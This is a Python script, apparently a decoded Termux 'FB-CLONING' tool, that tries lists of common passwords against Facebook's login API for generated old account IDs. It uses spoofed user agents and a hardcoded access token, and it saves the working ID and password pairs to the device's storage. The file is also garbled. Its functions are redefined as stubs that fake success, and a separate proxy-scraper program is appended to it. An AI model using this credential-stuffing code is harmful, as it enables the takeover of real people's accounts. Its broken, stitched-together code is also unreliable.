# GITHUB LINK : SKBER-CYBER
# DECODE BY : MUHAMMAD JAKARIYA HASAN
import os
import sys
import platform
import random
import requests
import sys
import time
from datetime import datetime, date
import os
from concurrent.futures import ThreadPoolExecutor

def request_storage_permission():
    try:
        os.makedirs('/sdcard/@MdALAMGIR', exist_ok=True)
        print("Storage permission granted!")
    except Exception as e:
        print(e)
        print("\x1b[1;93m Allow Termux Permissions! And Run Again ")
        os.system('termux-setup-storage')

def display_banner():
    os_platform = sys.platform
    if 'linux' in os_platform.lower():
        os.system('clear')
        print("\x1b[38;5;196m ██████ \x1b[33;1m██    ██ \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██████")
        print("\x1b[38;5;196m██       \x1b[33;1m██  ██  \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██")
        print("\x1b[38;5;196m██        \x1b[33;1m████   \x1b[38;5;46m██████  \x1b[34;1m█████   \x1b[38;5;196m██████")
        print("\x1b[38;5;196m██         \x1b[33;1m██    \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██")
        print("\x1b[38;5;196m ██████    \x1b[33;1m██    \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██   ██")
        print("\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print("\x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mDEVELOPER \x1b[1;91m :   \x1b[1;92mSHOHAG-KHAN")
        print("\x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mFACEBOOK \x1b[1;91m  :   \x1b[1;92m𝐓𝐄𝐀𝐌-𝐂𝐘𝐁𝐄𝐑-𝟎𝟑")
        print("\x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mTOOL TYPE \x1b[1;91m :   \x1b[1;92mFB-CLONING")
        print("\x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mVERSION \x1b[1;91m   :   \x1b[1;92m12.0")
        print("\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    else:
        os.system('cls')
        print("\x1b[38;5;196m ██████ \x1b[33;1m██    ██ \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██████")
        print("\x1b[38;5;196m██       \x1b[33;1m██  ██  \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██")
        print("\x1b[38;5;196m██        \x1b[33;1m████   \x1b[38;5;46m██████  \x1b[34;1m█████   \x1b[38;5;196m██████")
        print("\x1b[38;5;196m██         \x1b[33;1m██    \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██")
        print("\x1b[38;5;196m ██████    \x1b[33;1m██    \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██   ██")
        print("\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print("\x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mDEVELOPER \x1b[1;91m :   \x1b[1;92mSHOHAG-KHAN")
        print("\x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mFACEBOOK \x1b[1;91m  :   \x1b[1;92m𝐓𝐄𝐀𝐌-𝐂𝐘𝐁𝐄𝐑-𝟎𝟑")
        print("\x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mTOOL TYPE \x1b[1;91m :   \x1b[1;92mFB-CLONING")
        print("\x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mVERSION \x1b[1;91m   :   \x1b[1;92m12.0")
        print("\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

def creationyear(uid):
    if len(uid) == 15:
        if uid[10:15] in ('1000000000',):
            return '2009'
        elif uid[9:15] in ('100000000',):
            return '2009'
        elif uid[8:15] in ('10000000',):
            return '2009'
        elif uid[7:15] in ('1000000', '1000001', '1000002', '1000003', '1000004', '1000005'):
            return '2009'
        elif uid[7:15] in ('1000006', '1000007', '1000008', '1000009'):
            return '2010'
        elif uid[6:15] in ('100001',):
            return '2010'
        elif uid[6:15] in ('100002', '100003'):
            return '2011'
        elif uid[6:15] in ('100004',):
            return '2012'
        elif uid[6:15] in ('100005', '100006'):
            return '2013'
        elif uid[6:15] in ('100007', '100008'):
            return '2014'
        elif uid[6:15] in ('100009',):
            return '2015'
        elif uid[5:15] in ('10001',):
            return '2016'
        elif uid[5:15] in ('10002',):
            return '2017'
        elif uid[5:15] in ('10003',):
            return '2018'
        elif uid[5:15] in ('10004',):
            return '2019'
        elif uid[5:15] in ('10005',):
            return '2020'
        elif uid[5:15] in ('10006',):
            return '2021'
        elif uid[5:15] in ('10009',):
            return '2023'
        elif uid[7:15] in ('10007', '10008'):
            return '2022'

def generate_user_agent():
    rr = random.randint(1, 999)
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWALAMGIR')
    rx = random.randrange(1, 999)
    user_agent = f"Mozilla/5.0 (Windows NT {rr}; Win64; x64){aZ}{rx}.0.{random.randint(4500, 4999)}.{random.randint(99, 149)} Chrome/{random.randint(99, 175)}.0.{random.randint(0, 5)} Safari/537.36"
    return user_agent

def ua():
    rr = random.randint(1, 999)
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
    zA = random.choice('abcdefghijklmnopqrstuvwxyz')
    rx = random.randrange(1, 999)
    xx = f"Mozilla/5.0 (Windows NT 10.0; {rr}; Win64; x64){aZ}{zA}{rx}.0.{random.randint(4500, 4999)}.{random.randint(99, 149)} Chrome/{random.randint(99, 175)}.0.{random.randint(0, 5)} Safari/537.36"
    return xx

def generate_user_agent():
    major_version = random.choice(range(5, 8))
    minor_version = random.choice(range(0, 10))
    build_number = random.choice(range(552, 662))
    user_agent = (
        f'Mozilla/5.0 (Windows; U; Windows NT {random.choice(["6.1", "10.0"])}; '
        f'WOW64) AppleWebKit/534.{random.choice(range(5, 8))} (KHTML, like Gecko) '
        f'Chrome/{major_version}.{minor_version}.{build_number}.0 Safari/534.{random.choice(range(1, 120))}'
    )
    
    return user_agent

def generate_user_ids(limit=1000):
    """Generate a list of random user IDs."""
    return [str(random.randint(111111111, 999999999)) for _ in range(limit)]
def login(uid):
    """Attempt to log in with the given user ID."""
    session = requests.Session()
    passwords = [
        '123123', '112233', 'password', '@@@###', '654321', 
        '87654321', '0987654321', '111111', '222222', '000000', 
        '11223344', '666666', '00000000', '@@@@@@', 'asdfghjkl', 
        'qwertyuiop', 'zxcvbnm'
    ]
    
    for pw in passwords:
        response = session.get(
            'https://b-api.facebook.com/method/auth.login',
            params={
                'format': 'json',
                'email': uid,
                'password': pw,
                'credentials_type': 'device_based_login_password',
                'generate_session_cookies': '1',
                'error_detail_type': 'source',
                'method': 'GET',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_caller_class': 'com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'fb_api_req_friendly_name': 'device_based_login'
            },
            headers={
                'User-Agent': generate_user_agent(),
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        )
        
        response_json = response.json()
        
        if 'session_key' in response_json:
            with open('/sdcard/ALAMGIR_old.txt', 'a') as file:
                file.write(f'[Account👉] {uid}|{pw}|{creationyear(uid)}\n')
            print(f'[Account👉] {uid} | {pw} | {creationyear(uid)}')
            profile_link = f'https://www.facebook.com/profile.php?id={uid}'
            print(f' PROFILE LINK ➤ {profile_link}')
            with open('/sdcard/ALAMGIR/OLD-UID/ALAMGIR_old_uid_ok.txt', 'a') as file:
                file.write(f'[Md-OK] {uid}|{pw}|{creationyear(uid)}\n')
            successfull.append(f'{uid}|{pw}')
            return
            
successfull = []
def print_banner():
    print("Update-Coming")
    print("CLONE 2009-2010")
    print(" ")
    print("CONTACT DEVELOPER")
    print("-" * 30)
def generate_user_ids(count, limit=None):
    user_ids = []
    for i in range(count):
        user_id = f"user_{i+1}"
        user_ids.append(user_id)
        if limit and len(user_ids) >= limit:
            break
    return user_ids
def login(user_id):
    print(f"Logging in {user_id}...")
    return True  
def main():
    print_banner()    
    choice = input("Select: (1 or 01) ")
    if choice in ('1', '01'):
        MdALAMGIR = '10000'
    else:
        MdALAMGIR = '100000'    
    if MdALAMGIR == '100000':
        print("EXAMPLE: 1000 | 2000 | 5000 | 10000")    
    limit = int(input("LIMIT: "))    
    if MdALAMGIR == '100000':
        user_ids = generate_user_ids(int(MdALAMGIR), limit)
    else:
        user_ids = generate_user_ids(int(MdALAMGIR))    
    print("OK/CP IDS WILL BE SAVED IN /SDCARD")
    print(f"TOTAL UID: {len(user_ids)}")    
    from concurrent.futures import ThreadPoolExecutor    
    with ThreadPoolExecutor(max_workers=40) as pool:
        pool.map(login, user_ids)    
    print("PROGRAM FINISHED.")
    print(f"TOTAL OK: {len(user_ids)}")
    input("[ Press enter to back ]")
    main()

"""
@ the script originally written by ---( Bangladesh Hokar Potty )---
@ Facebook : https://www.facebook.com/Normal.User.Alamgir.your.109
@ WhatsApp : +8801712034653
"""

import random
import requests
import sys
import time
from datetime import datetime, date
import os
from concurrent.futures import ThreadPoolExecutor
directories = ['/sdcard/ALAMGIR', '/sdcard/Md-ALAMGIR', '/sdcard/ALAMGIR/Md-ALAMGIR']
for folder_path in directories:
    os.makedirs(folder_path, exist_ok=True)
response = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all')
prox = response.text
with open('/sdcard/.proxy.txt', 'w') as file:
    file.write(prox)
G = '\x1b[1;92m'
W = '\x1b[0;97m'
Y = '\x1b[1;93m'
B = '\x1b[1;90m'
now = datetime.now()
date_and_year = f"{now.day}-{now.month}-{now.year}"
def Banner():
    print(f"{G}Welcome to the Proxy Scraper!{W}")
def creationyear():
    print("Created in 2023")
def generate_user_agent():
    return "User-Agent: Mozilla/5.0"
def generate_user_ids():
    return [random.randint(1000, 9999) for _ in range(10)]
def login():
    print("Logging in...")
def main():
    Banner()
    creationyear()
    print(f"Current date: {date_and_year}")
    print("Fetching user agents...")
    user_agents = generate_user_agent()
    print(f"User Agent: {user_agents}")
    print("Generating user IDs...")
    user_ids = generate_user_ids()
    print(f"User IDs: {user_ids}")
if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(f"An error occurred: {e}")